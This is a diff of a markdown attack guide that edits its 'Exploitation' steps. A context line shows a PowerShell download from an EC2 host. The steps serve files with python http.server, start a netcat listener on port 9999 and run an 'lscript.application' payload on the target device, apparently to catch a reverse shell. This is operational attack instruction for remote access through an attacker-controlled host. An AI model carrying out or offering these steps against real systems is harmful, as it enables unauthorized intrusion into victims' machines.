@@ -39,7 +39,8 @@ echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws
 
 ## 3. Exploitation
 
-1. Go to your EC2 Instance, make sure there is an inbound rule entry in the security groups for port 9999 for only the public IP of the target device that will be used.
-2. Start the listener with ```nc -lnvp 9999```
-3. Execute the _lscript.application_ file on the target device.
-4. Check the listener.
+1. Run sudo **python -m http.server 9999**
+2. Go to your EC2 Instance, make sure there is an inbound rule entry in the security groups for port 9999 for only the public IP of the target device that will be used.
+3. Start the listener with ```nc -lnvp 9999```
+4. Execute the _lscript.application_ file on the target device.
+5. Check the listener.
